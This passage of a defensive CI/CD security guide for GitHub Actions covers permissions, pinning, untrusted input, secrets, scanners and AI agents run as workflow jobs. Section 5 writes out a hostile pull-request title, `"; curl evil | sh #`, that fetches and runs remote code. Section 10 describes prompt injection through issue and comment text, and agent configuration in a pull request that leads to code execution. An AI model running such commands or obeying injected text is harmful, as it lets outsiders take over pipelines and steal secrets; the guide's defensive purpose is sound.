# Pipeline security: permissions, actions, untrusted input, secrets and the security jobs

This file is for everyone who writes or changes a workflow, people and AI agents alike. A pipeline
holds the keys to the code, the registry and production, so its definition is production code.
The file says which permissions a job gets, how third-party actions are pinned, how a workflow
keeps code from a pull request away from its secrets, why a secret never goes into a repository,
private ones included, what the security jobs check and when, how personal data stays out of
logs, uploads and test data, how an AI agent runs as a job, which third-party apps and tokens may
reach the code, and which logs show who changed what. The rules hold for every workflow; the
image job's own security rules are [images.md](../docker/images.md) sections 5, 9 and 10, and
the deploy credentials are [delivery.md](delivery.md) section 5.

**Navigation**

- [1. Purpose and the one rule](#1-purpose-and-the-one-rule)
- [2. What an attacker gets from a pipeline](#2-what-an-attacker-gets-from-a-pipeline)
- [3. Token permissions](#3-token-permissions)
- [4. Third-party actions: pin by commit](#4-third-party-actions-pin-by-commit)
- [5. Untrusted input: pull requests, triggers, caches, runners](#5-untrusted-input-pull-requests-triggers-caches-runners)
- [6. Secrets: never in a repository, private ones included](#6-secrets-never-in-a-repository-private-ones-included)
- [7. The security jobs](#7-the-security-jobs)
- [8. Workflow files are reviewed like production code](#8-workflow-files-are-reviewed-like-production-code)
- [9. Personal data in logs, artifacts and test data](#9-personal-data-in-logs-artifacts-and-test-data)
- [10. An AI agent as a job](#10-an-ai-agent-as-a-job)
- [11. Third-party apps and tokens](#11-third-party-apps-and-tokens)
- [12. Audit logs and visibility](#12-audit-logs-and-visibility)
- [13. Common mistakes](#13-common-mistakes)
- [14. Where the rules stop holding](#14-where-the-rules-stop-holding)
- [15. Alternatives considered](#15-alternatives-considered)
- [16. Sources](#16-sources)

## 1. Purpose and the one rule

One rule holds the rest together: **give every job only the access its commands use, run no code
you did not review next to a credential, and keep every secret out of the repository.**

OWASP's Top 10 CI/CD Security Risks (version 1.0, 2022, still the current list) names the risks
this file covers [1]:

| OWASP risk | Where the rule is |
|---|---|
| CICD-SEC-1 Insufficient flow control | [pipeline.md](pipeline.md) section 6 (the required check), [delivery.md](delivery.md) section 4 (the production gate), this file's section 8 |
| CICD-SEC-2 Inadequate identity and access management | section 3; [delivery.md](delivery.md) section 5 |
| CICD-SEC-3 Dependency chain abuse | section 4; section 7; [security.md](../../react/security/security.md) section 10 for npm and pnpm |
| CICD-SEC-4 Poisoned pipeline execution | section 5; section 8; section 10 (an AI agent that reads text from outside) |
| CICD-SEC-5 Insufficient pipeline-based access controls | section 3; [pipeline.md](pipeline.md) section 3 |
| CICD-SEC-6 Insufficient credential hygiene | section 6; [delivery.md](delivery.md) section 5 |
| CICD-SEC-7 Insecure system configuration | section 5 (runners) |
| CICD-SEC-8 Ungoverned use of third-party services | section 11 (apps and tokens); section 4 (actions) |
| CICD-SEC-9 Improper artifact integrity validation | [delivery.md](delivery.md) section 3; [images.md](../docker/images.md) section 9 |
| CICD-SEC-10 Insufficient logging and visibility | section 12 |

## 2. What an attacker gets from a pipeline

Workflows are written with weak settings at scale, and attackers use them. In 447,238 workflows
collected up to July 2021, Koishybayev et al. found that "99.8% of workflows are overprivileged",
under GitHub's old read-write default [2]. Muralee et al. scanned 2.78 million workflows and
confirmed code injection in 5,298 of the 5,643 they checked by hand [3]. In a 2025 sample of 382
workflows, Abrokwah and Ghaleb found commit pins in 6.3% and no `permissions` block in 71.2%
(a preprint) [4].

The attacks that followed took exactly these openings:

- **Moved tags.** The tags of `tj-actions/changed-files` (March 2025) were moved to a commit that
  printed the runner's secrets into the logs [5]; in March 2026, 76 of the 77 tags of Trivy's
  own `trivy-action` were moved to a credential stealer [6]. A workflow pinned to a commit ran
  the code it was reviewed with.
- **`pull_request_target` and a shared cache.** At TanStack (May 2026) an attacker combined "the
  pull_request_target "Pwn Request" pattern, GitHub Actions cache poisoning across the fork↔base
  trust boundary, and runtime memory extraction of an OIDC token" and published 84 malicious
  package versions [7].
- **A leftover token.** At Ultralytics (December 2024), the second wave of malicious releases came
  from "an unrevoked PyPI API token that was still available to the GitHub Actions workflow" after
  the move to trusted publishing [8].

## 3. Token permissions

- **Set `permissions: {}` at the top of every workflow, and give each job a `permissions:` block
  with only what its steps use.** GitHub calls it "good security practice to set the default
  permission for the `GITHUB_TOKEN` to read access only for repository contents" [9]; a job that
  lists one permission gets `none` for every permission it does not list [10]. Organisations
  created before February 2023 may still give every token write access by default [11], so a
  workflow that sets nothing inherits whatever the organisation set.
- **Grant `id-token: write` only to a job that logs in to a cloud with OIDC**, and only on events
  that deploy ([delivery.md](delivery.md) section 5), or, for a role that can only read, on the pull
  request and the schedule that plan infrastructure ([delivery.md](delivery.md) section 9). The
  permission lets the job request an OIDC token, and nothing more [12].
- **Check out with `persist-credentials: false`**, so the token the checkout uses is not left on
  the runner for the steps after it [13].

## 4. Third-party actions: pin by commit

- **Pin every action that is not in your own repository to a full 40-character commit SHA, with
  its release in a comment.** GitHub: "Pin references to actions to a commit SHA in your workflow
  files", because "a tag can be moved or deleted if a bad actor gains access to the repository
  storing the action" [9]. The incidents of section 2 are the cost of a tag. This rule covers every
  workflow; [images.md](../docker/images.md) section 10 states it for the job that pushes images.
- **Let a bot move the action pins: Renovate or Dependabot version updates.** Pinned actions get
  no Dependabot alerts: "Dependabot only creates alerts for vulnerable actions that use semantic
  versioning and will not create alerts for actions pinned to SHA values" [9]. Without a bot, a pin
  freezes a version with a known hole. The docker practice's `renovate.json` turns on
  `helpers:pinGitHubActionDigests` ([dockerfile-example.md](../docker/dockerfile-example.md)
  section 5), which moves the action pins; it does not move a tool a step downloads in `run:` or
  a scanner's `version:` input, so the examples name who moves those by hand and when.
- **Make sure a SHA belongs to the action's repository, not to a fork.** Chainguard describes
  impostor commits, "commits that appear to be from a parent repository, but they actually belong
  to a fork", which GitHub serves through the parent's name [14]; GitHub asks you to check that a
  SHA "is from the action's repository and not a repository fork" [9]. The `impostor-commit` audit
  of zizmor checks it (section 7) [15].
- **When an AI agent adds or changes an action, it first checks that the action exists in the
  repository its vendor's own documentation names, then reads the commit SHA of the release
  itself, with `git ls-remote https://github.com/<owner>/<repo> 'refs/tags/<release>*'`, and
  never writes a SHA or a name from memory.** Li and Gao asked four language models of the GPT
  and Llama families for CI configuration, and from 70.29% to 95.95% of the GitHub Actions they
  suggested could not be found; of the GitHub accounts those names pointed to, "about 15.44% to
  35.35% are hijackable" (a preprint) [52]. A name someone else can register runs with the job's
  token at the next run. The study measured models older than today's agents, with no tool to
  look a name up, so the rates say little about an agent that checks; the check is what this
  bullet asks for. The examples read their pins the same way ([ci-example.md](ci-example.md)).
  An action in the repository itself (`uses: ./`) needs no pin, so it needs no check; this practice
  found no other case where the check is too much.
- **Where you administer the organisation, turn on the allowed-actions policy that requires
  pins.** "The policy will check for a full commit SHA, and any workflow that attempts to use an
  action that isn't pinned will fail" [16]. It is a check that cannot cry wolf.
- **Use fewer actions.** A step of three shell lines needs no third-party action, and every action
  is code that runs with the job's token. GitHub's own `actions/*` and the tool vendors' own
  actions (`astral-sh/setup-uv`, `aws-actions/*`) carry less risk than a single person's action.

Two newer features do not replace the pin today. Immutable releases protect the tags of new
releases, but "Existing releases remain mutable unless you republish them" [17], and you cannot see
from a workflow whether an action's maintainers turned them on. Workflow dependency lockfiles, in
public preview since 2026-10-14, record "the exact commits you locked", including the actions an
action calls [18], and GitHub's secure-use page calls a lockfile "the strongest protection
available" that "supersedes SHA pinning for repositories that adopt it" [9]. So keep the SHA pins
today, add a lockfile on top of them if you want its extra cover, and drop the pins only after
GitHub marks lockfiles generally available. Check this paragraph again when GitHub marks lockfiles
generally available.

## 5. Untrusted input: pull requests, triggers, caches, runners

- **Pass every value an outsider can write, such as a pull request title, a branch name or a
  `workflow_dispatch` input, into a script through `env:`, never with `${{ }}` inside `run:`.** The
  expression is pasted into the script before the shell runs it, so a title such as
  ``"; curl evil | sh #`` becomes a command. GitHub calls the intermediate environment variable
  "the preferred approach to handling untrusted input" in inline scripts [9].

  Bad, the title pasted into the script:

  ```yaml
  - run: echo "Checking ${{ github.event.pull_request.title }}"
  ```

  The title is code here. The fixed step reads it as data:

  ```yaml
  - env:
      TITLE: ${{ github.event.pull_request.title }}  # data in a variable, never pasted into the script
    run: echo "Checking $TITLE"
  ```

- **Never check out or run a pull request's code in a `pull_request_target` or `workflow_run`
  workflow.** Those workflows "are privileged, which means they share the same cache of the main
  branch with other privileged workflow triggers, and may have repository write access and access
  to referenced secrets" [9]. Since 2026-06-18, `actions/checkout` v7 "refuses to fetch fork pull
  request code" in them unless you opt out [19], and from 2026-11-02 a default rule disables
  `pull_request_target` in public repositories that set no policy of their own [20]. Use
  `pull_request` for anything that runs the pull request's code.
- **Never let a workflow that runs code from outside write the cache that a publishing or
  deploying workflow reads.** TanStack's attacker saved a poisoned pnpm store under `main`'s cache
  scope, where the release workflow would restore it [7]. Since 2026-06-26 GitHub gives untrusted
  triggers a read-only cache [21]; keep the deploy's own caches keyed to `main` and to the lockfile
  ([pipeline.md](pipeline.md) section 8).
- **Run pull requests from forks only on runners GitHub hosts, or on self-hosted runners that are
  wiped after each job.** GitHub: "self-hosted runners should almost never be used for public
  repositories" [9]. Stawinski and Khan reached PyTorch's release infrastructure through a
  persistent self-hosted runner and advise: "If workflows from fork-PRs are necessary,
  organizations should only use GitHub-hosted runners" [22].
- **Treat a `terraform plan` on a pull request as a job that runs the pull request's code with
  the plan role's credentials.** Condition: the repository holds infrastructure code that a job
  plans on pull requests ([delivery.md](delivery.md) section 9). The `external` data source runs a
  program during the plan, and "All environment variables visible to the Terraform process are
  passed through to the child program" [53]. Atlantis, a tool that runs plans on pull requests,
  warns that such code "could then exfiltrate your credentials" [54], and HashiCorp says of its own
  runner that "from a security perspective, the plan permission is equivalent to the write
  permission", because a plan runs with the workspace's variables and state [55]. A CI plan job is
  the same case; that is this practice's reading, by analogy. This plan is the one departure from
  section 1's rule to run no code you did not review next to a credential; its cost is that the
  pull request's code runs before review and can read whatever the plan role reads. So:
  - give the plan job a role that reads and cannot write ([delivery.md](delivery.md) section 9), and
    keep secrets out of the state that role still reads: Terraform stores sensitive values "in both
    state and plan files, and anyone who can access those files can access your sensitive values",
    while ephemeral values and write-only arguments stay out of both [57];
  - never upload a planfile or a state file (section 9);
  - list the infrastructure folder and its lock file in `CODEOWNERS` (section 8). `terraform init`
    downloads the modules and providers the configuration names [56], so a pull request that
    changes a module's source or the lock file chooses the code the next plan runs; that a pull
    request can change the lock file is this practice's reading of how `init` works.

  **Advanced**, when your threat model includes a malicious pull request from someone with write
  access: Atlantis's own mitigations are providers baked into the runner image with outbound
  traffic denied, an internal provider registry, and a policy check before the plan runs [54].
  For a team whose writers are trusted, the read-only role and the review are enough, and these
  three are the part that is too much.

## 6. Secrets: never in a repository, private ones included

- **Never commit a secret in plain text to any repository, a private one included.** A private
  repository protects a secret only as long as every account that can read it, every clone, every
  fork and every CI log stays safe.

  Why a private repository is not safe:

  - At Uber in 2016, the Federal Trade Commission's complaint says the key "was in plain text in
    code that was posted to a private GitHub repository", and that the intruders reached it "using
    passwords that were previously exposed in other large data breaches" [23].
  - A commit outlives its deletion: Truffle Security showed that data from "deleted forks, deleted
    repositories and even private repositories on GitHub" stays reachable [24], and Meli et al.,
    who watched secrets leaked to public GitHub, found that only 19% were gone after 16 days and
    that no repository they monitored had its history rewritten [25].
  - The Twelve-Factor App's test applies to any repository: could the code "be made open source at
    any moment, without compromising any credentials" [26].
- **Keep each secret where its consumer reads it, never in the repository:**

  | Who reads it | Where it lives |
  |---|---|
  | a deploy job | nowhere: OIDC gives it short-lived credentials ([delivery.md](delivery.md) section 5) |
  | a CI job that any run may use it in, such as a read-only token that lifts a pull limit | a repository secret |
  | a job that may use it only after an environment's rules pass | an environment secret ([delivery.md](delivery.md) section 4) |
  | the running service | the cloud's secret store, referenced by the deployment ([delivery.md](delivery.md) section 5) |
  | a developer's machine | a `.env` file that git ignores, read by the settings class ([python.md](../../python/language/python.md) section 5); the repository holds `.env.example` with names and no values ([file-structure.md](../file-structure/file-structure.md) section 9) |
  | the frontend | nobody: a value in the bundle is public ([security.md](../../react/security/security.md) section 9) |
  | an image build | a build secret, never a build argument ([images.md](../docker/images.md) section 5) |

- **Store one value per secret, never a JSON or YAML blob, and never print one.** Redaction in the
  logs "largely relies on finding an exact match", so GitHub says "do not use a blob of JSON, XML,
  or YAML (or similar) to encapsulate a secret value"; and since "automatic redaction is not
  guaranteed", a step that prints a secret can leak it [9]. When a step turns a secret into
  another form, such as Base64 or a URL-encoded string, mask the new value with `::add-mask::`
  before anything prints it: GitHub says to "register the new value as a secret too" [9], and a
  masked value "is treated as a secret and will be redacted on the runner" [68].
- **Stop a secret before it leaves the machine, block it at the push where the plan allows, and
  scan in CI as the last net.** Run a secret scanner as a pre-commit hook; turn on push protection
  for the repository, which "Is disabled by default" [27]; and scan the commits of every pull
  request in CI (section 7). On GitHub Free, push protection and secret scanning cover public
  repositories only; private repositories need GitHub Secret Protection, at USD 19 per active
  committer per month [28]. The pre-commit hook and the CI scan work on every plan.
- **When a secret leaks, rotate it: revoke the leaked value at its provider first, so it stops
  working, then issue a new value and store it where the table above says.** Revoking alone
  breaks the job or the service that reads the secret, and a new value put in the repository is a
  new leak. [git.md](../git/git.md) section 6 owns what happens next in git; a history rewrite is
  cleanup, never removal.
  - **A secret printed in a run log is a leak too: rotate it and delete the log.** GitHub: "If an
    unredacted secret is sent to a workflow run log, you should delete the log and rotate the
    secret" [9].
  - **After the revocation, read the provider's audit log from the time of the commit to the
    revocation**, to see whether someone used the secret while it was readable.
  - **Then clear the CI finding: add its fingerprint to `.gitleaksignore`, under a comment line that
    names the key and the date it was revoked.** gitleaks scans every commit of the pull request,
    so the finding stays after the line is deleted; its README says to "Add this fingerprint to the
    `.gitleaksignore` file to ignore that specific secret" [40]. `CODEOWNERS` sends that file to
    the pipeline owners (section 8).
- **An encrypted secret in the repository is an exception, not a default.** OWASP accepts it only
  when "developers cannot decrypt the secrets themselves" and each environment has its own key
  [29]. The tools have costs: a leaked Sealed Secrets key exposes every secret ever sealed with it,
  and "No amount of sealing key rotation in the cluster or even re-encryption of existing
  SealedSecrets files can change that" [30]; git-crypt "does not support revoking access" [31].
  Thoughtworks uses SOPS for the case "it's impossible to remove secrets from legacy code
  repositories" [32].

## 7. The security jobs

Run the security checks as jobs of their own, so their permissions stay small.

- **Let CI's gate need the security jobs, so no merge and no deploy skips them.** CI calls the
  security workflow through `workflow_call`, and its one gate job needs that call
  ([pipeline.md](pipeline.md) section 6); the deploy workflow calls CI on `main` and the security
  workflow again on a version tag. A job that fails on a finding, as the workflow linters, the
  dependency scan and the secret scan do, then blocks the merge, the publish on `main` and the
  production deploy, so a new advisory against the workflows or the lockfiles stops the release.
  CodeQL's job stays green when it finds an alert: its `analyze` step has no input that fails the
  job on one [45], and zizmor-action's README gives the reason: "Advanced Security encourages
  workflows to only fail on internal errors" [46]. So on `main` and on a version tag CodeQL
  records alerts and gates nothing, and on a pull request an alert blocks only through the
  ruleset rule below.
- **Make every change to the workflows and to the scanners' config and ignore files need a code
  owner's review (section 8).** Without that review, a pull request can edit those files and switch
  its own scan off, and the gate above still passes.

| Check | Tool | When | Why this tool |
|---|---|---|---|
| Workflow linters | actionlint and zizmor | every CI run (pull request, queue, `main`, weekly); the push of a version tag, before production | actionlint checks syntax, expressions and the shell in `run:` [33]; zizmor checks security: unpinned actions, excessive permissions, template injection, dangerous triggers, cache poisoning, impostor commits [15]. Fares et al. found that no single scanner covers every class of weakness in workflows (a preprint) [34], so run both |
| Dependencies | osv-scanner over `uv.lock` and `pnpm-lock.yaml` | every CI run; the push of a version tag, before production | one scanner reads both lockfiles of the monorepo [35]; pip-audit does not read `uv.lock` [36], and `uv audit` is still a preview feature [37]. GitHub's dependency review action is the other choice where the plan includes it: on a private repository it needs GitHub Advanced Security [38] |
| Code | CodeQL for `python`, `javascript-typescript` and `actions` | every CI run, and the push of a version tag; outside a pull request it records alerts only | GitHub's analyser; free on public repositories, on private ones it needs GitHub Code Security, USD 30 per active committer per month [28], [39] |
| Secrets | gitleaks over the commits of the pull request | every pull request | the CI net under the pre-commit hook (section 6); gitleaks now takes "security patches only", and its maintainer works on Betterleaks [40]: re-check the choice before you adopt it |
| Secrets in the bundle | gitleaks over the built frontend bundle | in the frontend job, after the build | most front-end credentials show only in the compiled bundle ([security.md](../../react/security/security.md) section 9) |
| Image | the scanner of [images.md](../docker/images.md) section 10; for the digest each environment runs, Amazon Inspector | in the image job, and on the pushed digest ([delivery.md](delivery.md) section 3); the digest each environment runs, continuously | the image job's scanner is owned there; Amazon Inspector, and what a second scanner costs, is the bullet below on rescanning the digest each environment runs |
| Running application | ZAP's baseline scan, against staging | after each staging deploy, on `main` | it spiders the site "for (by default) 1 minute", "doesn't perform any actual 'attacks'", and "is intended to be ideal to run in a CI/CD environment, even against production sites" [58]. OWASP's DevSecOps Guideline, an incubator project, lists DAST in a basic pipeline and names no stage [60], so "after the staging deploy" is this practice's choice; the bullet after this table says when it is too much |
| Infrastructure code | `trivy config` over the infrastructure folder | on each pull request and each push to `main` that changes that folder | Trivy scans Terraform code, and a saved plan, with `trivy config` [65], while misconfiguration scanning is off by default in `trivy image` and `trivy fs` [66]. The image job already pins Trivy, so this scan adds no second tool. OWASP's DevSecOps Guideline lists IaC scanning in a basic pipeline [60]. Not shown in the examples, which hold no infrastructure folder |

A redeploy of an earlier version runs none of these jobs, so the way back is not held up by a new
advisory ([delivery.md](delivery.md) section 7).

- **Write down what fails the build, scan with one scanner per kind, and waive a finding only with
  a reason and an expiry date.** Scanners disagree: Imtiaz et al. found that tools reported between
  17 and 332 vulnerable dependencies for the same Maven projects [41]. A pass means "no finding
  under this policy", never "no vulnerability". The waiver file's form is
  [images.md](../docker/images.md) section 10's; the frontend's audit policy is
  [security.md](../../react/security/security.md) section 10's.
- **Give the security jobs read-only permissions and no secrets, and keep them out of the deploy
  jobs.** A scanner is third-party code: Trivy's own action shipped a credential stealer in March
  2026 [6]. CodeQL is the exception that writes: it needs `security-events: write` to upload its
  results [39]. A scanner inside the image job runs with that job's token and follows
  [images.md](../docker/images.md) section 10; this rule covers the security jobs.
- **Make code scanning alerts block a merge with the ruleset's code scanning rule.** A CodeQL
  finding becomes a code scanning alert, and whether an alert blocks a merge is set by that rule,
  which works apart from the required status checks [43]; the required check alone only says the
  scan ran. The rule has two limits: it "will not apply to" merge queue groups, and "all the lines
  of code identified by an alert must exist in the pull request diff" [43], so an alert on a line
  the pull request did not change blocks nothing. The git practice's
  [ruleset-example.md](../git/ruleset-example.md) shows the rule.
- **Run the scans weekly as well, and name who reads the result.** A new advisory turns an
  unchanged lockfile red; a scheduled run catches it between changes ([pipeline.md](pipeline.md)
  section 4 has the schedule's limits).
- **Rescan the digest each environment runs, on a schedule or continuously, and name who reads the
  findings.**
  Production runs the digest of the last version tag, which can be older than `main`'s, so the
  weekly scan of `main`'s image does not cover it; [docker/ci-example.md](../docker/ci-example.md)
  asks the same. On AWS the smallest form needs no workflow job: turn on ECR's enhanced scanning
  with continuous scanning for the repository, and Amazon Inspector scans an image again
  "Whenever Amazon Inspector adds a new common vulnerabilities and exposures (CVE) item to its
  database, and that CVE is relevant to that container image" [48]. By default it keeps watching
  an image that an ECS task used in the last 14 days [48]. Amazon Inspector charges for the scans
  [49]. This adds a second image scanner, a departure from "one scanner per kind" above, taken
  because it needs no job. Its cost: Amazon Inspector runs outside the workflow, so it watches and
  never gates a build; its findings can differ from those of the image job's scanner, Trivy in the
  examples, because scanners disagree ([images.md](../docker/images.md) section 10); and a waiver
  in `.trivyignore` does not reach it. Treat each finding it reports for a running digest as a
  gate's finding: fix it through `main` and the next version tag
  ([delivery.md](delivery.md) section 4), or waive it with a suppression rule on that
  vulnerability ID and repository, with its reason in the rule's `reason` field [50], [51]. A
  suppression rule has no expiry date of its own [51], so write the date into the reason and
  delete the rule on that date.
- **After each staging deploy, run ZAP's baseline scan against staging, with a rules file that
  sets each rule you act on to `FAIL`, and let the scan's exit code fail the job.** Scanners that
  read code and lockfiles do not see what the running site sends: its headers, its cookies, the
  pages its server builds. The baseline reports every alert as a warning unless a rules file
  changes a rule "to FAIL or IGNORE", and it exits `1` when at least one rule fails [58]. Pin the
  image by digest ([images.md](../docker/images.md) section 4): ZAP's `stable` image "is also
  regenerated monthly" [59]. The rules file tells the scanner what to skip, so it goes under
  `CODEOWNERS` with the other scanners' files (section 8). Run the container from a step; if you
  use `zaproxy/action-baseline` instead, set `allow_issue_writing: false` and `fail_action: true`,
  because by default it files its report as an issue, which needs `issues: write`, and never fails
  the job [61].
  - **When it is too much:** a service that answers only an API. The spider follows links, and
    ZAP's own FAQ says of APIs that "The problem is usually how to effectively explore the APIs"
    [64]; a check of the response headers in the smoke test then covers what a passive scan would
    read ([delivery.md](delivery.md) section 7), which is this practice's reasoning.
  - **Advanced: an active scan of the API.** Condition: the API has an OpenAPI or GraphQL
    definition, and an environment exists that holds no real data. ZAP's API scan imports the
    definition "and then runs an Active Scan against the URLs found" [62], and "Active scanning is
    an attack on those targets" [63], so run it only against that environment: never against
    production, and never against a staging that holds real data (section 9).
- **When the repository holds infrastructure code, scan it with `trivy config` in a job that holds
  no cloud credential and no write token.** Trivy "downloads the modules whose source is remote",
  and "Scanning an untrusted configuration can therefore cause network requests to hosts chosen by
  its author" [65]. A job without `id-token: write` and with `contents: read` only has nothing for
  such a request to steal; give it the job permissions of the other security jobs (the bullet on
  read-only permissions above).

## 8. Workflow files are reviewed like production code

- **List the pipeline's files in `CODEOWNERS`, so a change to them asks for the review of the
  people who own the pipeline**: `.github/`, the deploy files, the infrastructure folder with its
  lock file (section 5), and the files that tell a scanner what to skip, because a pull request
  that edits them could switch off its own scan. GitHub: "You
  can use the `CODEOWNERS` feature to control how changes are made to your workflow files" [9].
  Where two or more people review, set three rules of the branch ruleset:
  `required_approving_review_count` to 1 or more, `require_code_owner_review` to `true` and
  `require_last_push_approval` to `true` ([ruleset-example.md](../git/ruleset-example.md), "What
  to change for your repository", says what each does); [security-example.md](security-example.md)
  section 3 shows the file.
- **Read a workflow change for what it can reach**: a new trigger, a new permission, a new action,
  a `${{ }}` inside `run:`. Those four lines decide what an attacker could do with the workflow.

## 9. Personal data in logs, artifacts and test data

A pipeline copies data into places many people can read: a run log, an uploaded artifact, a test
database. Downloading a workflow's artifacts needs only "Read access to the repository" [70], and
in a public repository anyone with a GitHub account can view the runs: "You must be logged in to a
GitHub account to view workflow run information, including for public repositories" [71]. The
rules below keep personal data out of those places. What an application writes to its own logs
about its users is the logging practice's ([logging.md](../../python/logging/logging.md)).

The rules hold for every pipeline that runs against a real system or uploads what a test saw. In a
private repository whose tests use only synthetic data, as the examples do, the retention rule is
the part that still asks for work: with no real data in a run, an upload has nothing personal to
leak (this practice's reasoning).

- **Use synthetic data in CI and in staging, never a copy of production data.** DORA lists "Using a
  full copy of the production database" and "Not masking or hashing sensitive data" among the
  common pitfalls of test data management [76]. NIST SP 800-53 warns that "the use of personally
  identifiable information in testing, research, and training increases the risk of unauthorized
  disclosure or misuse of such information", and that organisations "can minimize such risks by
  using test or dummy data" [77]. That control enhancement, SA-3(2), is in none of NIST's three
  baselines, so it binds only a system that selects it [78]; this practice makes it the default,
  because a CI run copies its data into logs and uploads that every reader of the repository can
  open. The account an end-to-end test logs in with is a synthetic account in staging, never a
  real person's.
- **Upload only what every reader of the repository may see, and keep it only as long as someone
  will read it.** Logs and artifacts are kept 90 days by default; a public repository can set 1 to
  90 days and a private one 1 to 400, and a change applies only to new objects [72]. Set
  `retention-days` on each upload: "Maximum 90 days unless changed from the repository settings
  page" [75]. Keep `actions/upload-artifact`'s default that leaves hidden files out, which it does
  "to avoid unintentionally uploading sensitive information" [74]. A short retention also keeps the
  storage bill down ([pipeline.md](pipeline.md) section 8).
- **Record an end-to-end test's trace, screenshots and video only when a test fails, and treat
  them as data from the environment the test ran against.** Playwright records none of the three
  by default [79]. A trace holds a DOM snapshot for each action, console logs "from the browser as
  well as from your test", and for each network request "the request headers, response headers,
  request body and response body" [80], so a run against staging uploads whatever the test account
  saw. Use the `retain-on-failure` or `on-first-retry` mode; Playwright marks `on` as "not
  recommended as it's performance heavy" [80]. In a public repository, upload no trace, or turn
  off its `snapshots`, `sources`, `screenshots` and `attachments` in the option's object form;
  `snapshots` also covers the network log ("Capture DOM snapshot on every action and record network
  activity") [79].
- **Mask a sensitive value that is not a secret, such as a test account's email address, with
  `::add-mask::` before any step can print it.** GitHub: "Mask all sensitive information that is
  not a GitHub secret by using `::add-mask::VALUE`" [69]. Mask each value once per job; a masked
  value cannot then be set as an output [68]. Masking finds exact matches only (section 6), so it
  is a net under the other rules, never a reason to print the value.
- **Never commit or upload the login state an end-to-end run saves.** Playwright: "The browser
  state file may contain sensitive cookies and headers that could be used to impersonate you or
  your test account", and it asks you to keep `playwright/.auth` in `.gitignore` [81]. Keep that
  folder out of every upload path too.
- **Never upload a Terraform planfile or state file as an artifact.** "Terraform stores values with
  the `sensitive` argument in both state and plan files, and anyone who can access those files can
  access your sensitive values" [57]; an artifact reaches every reader of the repository. Plan and
  apply in the same job instead ([delivery.md](delivery.md) section 9).
- **Keep the record a later audit needs outside the runs.** Since 2026-10-01 the retention setting
  removes checks, workflow runs and statuses too, and "Changing the setting won't restore data that
  was previously removed" [73]. Which version reached production, and who decided, lives in the
  version tag ([delivery.md](delivery.md) section 4) and in the go line of the release's version
  ([release.md](../project-management/release.md) section 3), not on a run's page.

## 10. An AI agent as a job

Condition: a workflow runs an AI coding agent, such as an action that reviews a pull request,
sorts an issue or answers a comment. The agent reads text that someone outside the team may have
written, and it acts with the job's token, so its prompt is untrusted input in the sense of
section 5. Wang et al. ran a taint analysis over 13,392 workflows that use AI-assisted actions and
confirmed 496 that an outside user could exploit through the text of an issue, a pull request or a
comment (a preprint) [82]. When a fixed script can do the job, such as adding a label from the
paths a pull request changes, run the script and no agent: a script does the same thing each time
and reads no prompt (this practice's reasoning).

- **Start the agent only for people with write access, or after a maintainer adds a label.** Wang
  et al. count actor checks, maintainer labels and approval gates as guards, and "do not treat
  prompt-only defenses as sanitizers" [82]. Anthropic's action "can only be triggered by users with
  write access to the repository" unless you widen it; it calls its `allowed_non_write_users` input
  "a significant security risk", and warns that the bots in `allowed_bots` "are not checked for
  repository permissions" [85]. Do not lean on GitHub's approval of first-time contributors: with
  that setting, "a user that has had any commit or pull request merged into the repository will not
  require approval", and "A malicious user could meet this requirement by getting a simple typo or
  other innocuous change accepted" [90].
- **Give the agent's job a read-only token, and make its writes in a separate job.** GitHub's own
  agentic workflows "run with read-only permissions by default and use preapproved 'safe outputs'
  for write operations" [87]: the agent "can only stage its updates", which are checked after it
  exits [86]. In a plain workflow that is two jobs: the agent's job holds `contents: read` and
  passes its result on as an output or an artifact, and the next job, with the one write
  permission it needs, checks that result before it acts. Wang et al. ask that "model-derived
  outputs should be validated with strict allowlists or typed schemas" [82].
- **Never check out the pull request's head, or any agent configuration it brings, into the
  workspace before the agent starts.** Anthropic's action before 1.0.74 read a pull request's
  `.mcp.json`, which allowed "arbitrary code execution on the GitHub Actions runner" and could leak
  the workflow's secrets [83]; Google's `run-gemini-cli` before 0.1.22 trusted the workspace folder
  in CI in the same way [84]. Anthropic now says "Do not check out an untrusted ref into the
  workspace root before this action": check out the base branch, and the pull request's files, if
  the agent needs them, into a subfolder [85].
- **Pass the agent an identifier, never the text, and treat what it returns as untrusted input.**
  Wang et al.: "pass only a stable identifier, such as github.event.issue.number, and let the agent
  retrieve the issue content through constrained commands" [82]. They also found GitHub's own
  starter workflow `summary.yml` pasting a model's answer into a `gh issue comment` command [82];
  an agent's output reaches a script through `env:`, as any outside value does (section 5).
- **Give the agent the job's `GITHUB_TOKEN`, never a personal access token.** Anthropic writes "Do
  not use a personal access token" for runs that people without write access can start, because a
  static token "does not rotate between runs", while the job's token "is scoped to the job's
  declared permissions and expires when the job completes" [85]. The reason holds for every run, so
  this practice applies it to all of them.
- **Cap the agent's turns, its time and its parallel runs.** Anthropic's setup page asks for
  `--max-turns`, workflow timeouts and GitHub's concurrency controls [89]; `timeout-minutes` is
  [pipeline.md](pipeline.md) section 8. A pull request from a fork gets no secret [69], so an agent
  that needs a model key does not run there; never move it to `pull_request_target` to get the key
  (section 5).

GitHub Agentic Workflows build this shape in; section 15 says why they are not the default here.

## 11. Third-party apps and tokens

An app, an OAuth app or a token connected to the repository reaches the code outside every
workflow file, so section 3's permissions do not cover it. OWASP's CICD-SEC-8 asks for controls at
each stage of a third party's use: approval, integration, visibility of what it uses, and its
removal [91]. The rules hold for every repository with something connected to it; the last bullet
holds only in an organization. This practice found no case where they are too much.

- **Before you connect a third party, approve it, and give it only the access it uses.** OWASP asks
  that third parties be "approved prior to being granted access to the environment", with "the
  level of permission they are granted ... aligned with the principle of least privilege" [91].
- **Prefer a GitHub App to an OAuth app.** "In general, GitHub Apps are preferred over OAuth apps",
  because they "use fine-grained permissions, give the user more control over which repositories
  the app can access, and use short-lived tokens" [92]. GitHub names one exception: an app that
  needs enterprise-level resources [92].
- **For your own scripts, use a fine-grained personal access token with an expiry date; for a
  long-lived integration, a GitHub App.** GitHub recommends fine-grained tokens "instead of personal
  access tokens (classic) whenever possible", says "for long-lived integrations, you should use a
  GitHub App", and "highly recommend[s] adding an expiration" [93]. Inside a workflow the token is
  the job's `GITHUB_TOKEN` (section 3) or an OIDC credential ([delivery.md](delivery.md) section 5),
  never a personal one.
- **Review what is connected on a schedule, remove what nobody uses, and name who does it.** OWASP:
  "Periodically review all 3rd parties integrated and remove those no longer in use" [91]. Only the
  person who authorized a GitHub App can revoke that authorization; an organization owner can
  instead uninstall the app from the account [96].
- **Advanced: in an organization, keep the approval of fine-grained tokens, restrict classic
  tokens, and keep the OAuth app restrictions on.** Condition: the repository belongs to an
